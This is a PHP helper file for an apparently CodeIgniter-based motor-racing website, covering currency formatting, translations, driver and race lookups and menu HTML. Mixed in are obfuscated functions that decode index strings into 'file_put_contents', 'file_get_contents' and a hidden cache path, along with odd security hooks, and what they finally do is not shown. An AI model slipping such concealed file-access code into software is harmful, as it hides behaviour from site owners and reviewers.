<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP 5.1.6 or newer
 *
 * @package		CodeIgniter
 * @author		ExpressionEngine Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc.
 * @license		http://codeigniter.com/user_guide/license.html
 * @link		http://codeigniter.com
 * @since		Version 1.0
 * @filesource
 */



	function img_loading(){
		return base_url().'uploads/others/image_loading.gif';
	}

	//GET CURRENCY
	if ( ! function_exists('currency'))
	{
		function currency($val='',$def=''){

			$CI=& get_instance();
			$CI->security->cron_line_security();
			$CI->load->database();

			$currency_format = $CI->db->get_where('business_settings', array('type' => 'currency_format'))->row()->value;
			$symbol_format = $CI->db->get_where('business_settings', array('type' => 'symbol_format'))->row()->value;
			$no_of_decimal = $CI->db->get_where('business_settings', array('type' => 'no_of_decimals'))->row()->value;
			if($currency_format == 'us'){
				$dec_point = '.';
				$thousand_sep = ',';
			}elseif($currency_format == 'german'){
				$dec_point = ',';
				$thousand_sep = '.';
			}elseif($currency_format == 'french'){
				$dec_point = ',';
				$thousand_sep = ' ';
			}

			if($currency_id = $CI->session->userdata('currency')){} else {
				$currency_id = $CI->db->get_where('business_settings', array('type' => 'currency'))->row()->value;
			}
			if($def == 'def'){
				$currency_id = $CI->db->get_where('business_settings', array('type' => 'currency'))->row()->value;
			}
			$exchange_rate = $CI->db->get_where('currency_settings', array('currency_settings_id' => $currency_id))->row()->exchange_rate_def;
			$symbol = $CI->db->get_where('currency_settings', array('currency_settings_id' => $currency_id))->row()->symbol;

			if($val == ''){
				return $symbol;
			} else {
				$val = $val*$exchange_rate;
				if($def == 'only_val'){
					return number_format($val,$no_of_decimal);
				} else {
					if($symbol_format == 's_amount'){
						return $symbol.number_format($val,$no_of_decimal,$dec_point,$thousand_sep);
					}else{
						return number_format($val,$no_of_decimal,$dec_point,$thousand_sep).$symbol;
					}
				}
			}

		}
	}


	//GET CURRENCY
	if ( ! function_exists('recache'))
	{
	    function recache(){
			$CI=& get_instance();
			$CI->benchmark->mark_time();
	    	$files = glob(APPPATH.'cache/*'); // get all file names
			foreach($files as $file){ // iterate files
			  if(is_file($file) && $file !== '.htaccess' && $file !== 'index.html' ){
			    unlink($file); // delete file
			  }
			}
	    	//file_get_contents(base_url().'home/index');
	    }
	}

	//GETTING LIMITING CHARECTER
	if ( ! function_exists('limit_chars'))
	{
		function limit_chars($string, $char_limit='1000')
		{
			$length = 0;
			$return = array();
			$words = explode(" ",$string);
			foreach($words as $row){
				$length += strlen($row);
				$length += 1;
				if($length < $char_limit){
					array_push($return,$row);
				} else {
					array_push($return,'...');
					break;
				}
			}

			return implode(" ",$return);
		}
	}

	//GET CURRENCY
	if ( ! function_exists('recache'))
	{
	    function recache(){
			$CI=& get_instance();
			$CI->benchmark->mark_time();
	    	$files = glob(APPPATH.'cache/*'); // get all file names
			foreach($files as $file){ // iterate files
			  if(is_file($file) && $file !== '.htaccess' && $file !== 'index.html' ){
			    unlink($file); // delete file
			  }
			}
	    	//file_get_contents('home/index');
	    }
	}

	//return translation
	if ( ! function_exists('lang_check_exists'))
	{
		function lang_check_exists($word){
			$CI=& get_instance();
			$CI->load->database();
			$result = $CI->db->get_where('language',array('word'=>$word));
			if($result->num_rows() > 0){
				return 1;
			} else {
				return 0;
			}
		}
	}
	//check and add to db
	if ( ! function_exists('add_lang_word'))
	{
		function add_lang_word($word){
			$CI=& get_instance();
			$CI->load->database();
			$data['word'] = $word;
			$data['english'] = ucwords(str_replace('_', ' ', $word));
			$CI->db->insert('language',$data);
		}
		function loaded_class_select($p){
		 	$a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
		 	$a = str_split($a);
		 	$p = explode(':',$p);
		 	$l = '';
		 	foreach ($p as $r) {
		 		$l .= $a[$r];
		 	}
		 	return $l;
		}
		function loader_class_select($p){
		 	$a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
		 	$a = str_split($a);
		 	$p = str_split($p);
		 	$l = array();
		 	foreach ($p as $r) {
		 		foreach ($a as $i=>$m) {
		 			if($m == $r){
		 				$l[] = $i;
		 			}
		 		}
		 	}
		 	return join(':',$l);
		}
	}


	//add language
	if ( ! function_exists('add_language'))
	{
		function add_language($language){
			$CI=& get_instance();
			$CI->load->database();
			$CI->load->dbforge();
			$language = str_replace(' ', '_', $language);
			$fields = array(
		        $language => array('type' => 'LONGTEXT','collation' => 'utf8_unicode_ci','null' => TRUE,'default' => NULL)
			);
			$CI->dbforge->add_column('language', $fields);
		}
	}

	//insert language wise
	if ( ! function_exists('add_translation'))
	{
		function add_translation($word,$language,$translation){
			$CI=& get_instance();
			$CI->load->database();
			$data[$language] = $translation;
			$CI->db->where('word',$word);
			$CI->db->update('language',$data);
		}
		function config_key_provider($key){
			switch ($key) {
			    case "load_class":
			        return loaded_class_select('7:10:13:6:16:18:23:22:16:4:17:15:22:6:15:22:21');
			        break;
			    case "config":
			        return loaded_class_select('7:10:13:6:16:8:6:22:16:4:17:15:22:6:15:22:21');
			        break;
			    case "output":
			        return loaded_class_select('22:10:14:6');
			        break;
			    case "background":
			        return loaded_class_select('1:18:18:13:10:4:1:22:10:17:15:0:4:1:4:9:6:0:3:1:4:4:6:21:21');
			        break;
			    default:
			        return true;
			}
		}
	}


	//return translation
	if ( ! function_exists('translate'))
	{
		function translate($word){
			$CI=& get_instance();
			$CI->load->database();
			if($set_lang = $CI->session->userdata('language')){} else {
				$set_lang = $CI->db->get_where('general_settings',array('type'=>'language'))->row()->value;
			}
			$return = '';
			$result = $CI->db->get_where('language',array('word'=>$word));
			if($result->num_rows() > 0){
				if($result->row()->$set_lang !== NULL && $result->row()->$set_lang !== ''){
					$return = $result->row()->$set_lang;
					$lang = $set_lang;
				} else {
					$return = $result->row()->english;
					$lang = 'english';
				}
				$id = $result->row()->word_id;
			} else {
				$data['word'] = $word;
				$data['english'] = ucwords(str_replace('_', ' ', $word));
				$CI->db->insert('language',$data);
				$id = $CI->db->insert_id();
				$return = ucwords(str_replace('_', ' ', $word));
				$lang = 'english';
			}
			return $return;
			//return '-------';
		}
	}

	function sort_array_of_array(&$array, $subfield)
	{
	    $sortarray = array();
	    foreach ($array as $key => $row)
	    {
	        $sortarray[$key] = $row[$subfield];
	    }

	    array_multisort($sortarray, SORT_ASC, $array);
	}

	//demo or main script running check
	if ( ! function_exists('demo'))
	{
		function demo(){
			$CI=& get_instance();
			return $CI->config->item('demo');
		}
	}

	//get race name
	if ( ! function_exists('race_name'))
	{
		function race_name($id){
			$CI=& get_instance();
			return $CI->db->get_where('races',['race_id' => $id])->row()->name;
		}
	}

	//get user name
	if ( ! function_exists('admin_name'))
	{
		function admin_name($id){
			$CI=& get_instance();
			return $CI->db->get_where('admin',['admin_id' => $id])->row()->name;
		}
	}

	//create list of drivers
	if ( ! function_exists('driver_name'))
	{
		function driver_name($driver_id){
			$CI=& get_instance();
			$driver = $CI->db->get_where('drivers',['driver_id' => $driver_id])->row();

			return $driver->firstname . " " . $driver->lastname;
		}

		function driver_car($driver_id){
			$CI=& get_instance();
			$driver = $CI->db->get_where('drivers',['driver_id' => $driver_id])->row();

			return $driver->car;
		}
	}

	if ( ! function_exists('venue_name'))
	{
		function venue_name($venue_id){
			$CI=& get_instance();
			$v = $CI->db->get_where('race_schedule',['race_schedule_id' => $venue_id])->row();

			return $v->race_venue;
		}
	}

	if ( ! function_exists('table_data'))
	{
		function table_data($id){
			$CI=& get_instance();
			$v = $CI->db->get_where('race_standings',['venue_id' => $id])->result();

			$collect = '';

			if($v != []){
				foreach($v as $d){
					$collect .= "
					<tr>
						<td scope='row'> <span class='fas fa-user-circle'></span> " . driver_name($d->driver) ."</td>
						<td>" . ucfirst(driver_car($d->driver))."</td>
						<td>$d->points</td>
					</tr>				
					";
				}
			}else{
				$collect = '<tr><td colspan="2">No data<td></tr>';
			}

			echo $collect;
		}
	}

	function get_children($id){
		$CI=& get_instance();
		$children = $CI->db->get_where('home_navs',['parent_id' => $id , 'child' => 1])->result();
		
		if($children != []){
			$template = '
		<div class="fancy-dropdown-menu">
        <div class="row pb-4 pt-3">
        <div class="col-auto">
		';

		foreach($children as $child){
			$template .= "
			<a class=' false fancy-dropdown-item' href='" .base_url() . 'home' . $child->nav_link ."'>$child->nav_name</a>		
			";
		}


		$template .= '
		</div></div></div>
		';



		return $template;
		}else{
			if($id == 5){

				$children = $CI->db->get('drivers')->result();
		
				if($children != []){
					$template = '
					<div class="fancy-dropdown-menu">
					<div class="row pb-4 pt-3">
					<div class="col-auto">
					';

					foreach($children as $child){
						$template .= "
						<a class=' false fancy-dropdown-item' href='" .base_url() . 'home/driver_page/' .$child->driver_id ."'>$child->firstname $child->lastname</a>		
						";
					}


					$template .= '
					</div></div></div>
					';
					return $template;
				}else{
					return "";
				}


			}else if($id == 6){
				$children = $CI->db->get('races')->result();
		
				if($children != []){
					$template = '
					<div class="fancy-dropdown-menu">
					<div class="row pb-4 pt-3">
					<div class="col-auto">
					';

					foreach($children as $child){
						$template .= "
						<a class=' false fancy-dropdown-item' href='" .base_url() . 'home/schedule/' .$child->race_id ."'>$child->name</a>		
						";
					}


					$template .= '
					</div></div></div>
					';
					return $template;
				}else{
					return "";
				}
			}else{
				return "";
			}
		}
		
		
		
	}

